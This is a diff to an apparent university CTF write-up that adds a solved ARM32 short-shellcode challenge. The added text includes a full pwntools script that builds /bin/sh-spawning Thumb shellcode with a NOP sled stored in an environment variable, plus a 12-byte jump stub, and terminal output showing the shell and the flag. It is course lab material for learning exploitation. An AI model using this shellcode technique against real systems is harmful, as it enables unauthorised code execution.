@@ -164,7 +164,7 @@ CS6332{denUll1phi}
 The problem statement is below.
 
 ```md
-Can you write an amd64 shellcode without using non-ASCII characters
+Can you write an arm32 shellcode without using non-ASCII characters
 (i.e., charcodes from 0 upto 127)?
 ```
 
@@ -226,7 +226,80 @@ CS6332{n0T_tH@T_H@Rd}
 The problem statement is below.
 
 ```md
+Can you write a non-zero shellcode without using more than 16 bytes, in arm32?
+The program runs `setregid(getegid(), getegid())` for you.
+```
 
+Actually, this problem can be solved whithin 12 bytes.
+
+First, embed shellcode, which we used in `2-nonzero-shellcode-arm`, as an environmental variable. Then just jump to the address where you embed the shellcode!!
+
+However, it is a little bit tricky because it uses a gigantic nop sled and an alignment.
+
+To see where the shellcode is, you need to debug it in gdb. That's why you need a huge nop sled. Also, the variable is on the stack, which means it is sometimes mal-aligned. I.e., instructions may not start with an address divisible by 4. To resolved, add some alignments.
+
+You can't use null bytes to jump. Use `movt` and `movw` to set 32bit address in a register like this.
+
+```python
+shellcode = asm(
+    """
+movw r5, #0xf55c
+movt r5, #0xfffe
+bx r5
+"""
+)
+```
+
+The total code is like this.
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+from pwn import asm, context
+
+context.arch = "arm"
+context.bits = 32
+
+binshcode = asm("mov r8, r8") * 2000 # nop sled
+binshcode += asm(
+    """
+.code 32
+add     r2, pc, #1
+bx      r2
+.code 16
+adr     r0, binsh
+sub     r1, r1
+mov     r2, r1
+strb    r2, [r0, #7]
+mov     r7, 11
+svc     1
+binsh:
+    .ascii "/bin/shX"
+"""
+)
+binshcode += b"a" # for alignment
+with open("binshcode.bin", "wb") as binsh_file:
+    binsh_file.write(binshcode)
+shellcode = asm(
+    """
+movw r5, #0xf55c
+movt r5, #0xfffe
+bx r5
+"""
+)
+with open("shellcode.bin", "wb") as shellcode_file:
+    shellcode_file.write(shellcode)
+
+```
+
+You've got the flag.
+
+```bash
+TXK220008@ctf-vm3:~/unit2/4-short-shellcode-arm $ ./solve4.py; export a=`cat binshcode.bin`
+TXK220008@ctf-vm3:~/unit2/4-short-shellcode-arm $ ./4-short-shellcode-arm
+Reading shellcode from shellcode.bin
+$ cat flag
+CS6332{tHumbs_Up!}
 ```
 
 ## 5-stack-ovfl-arm
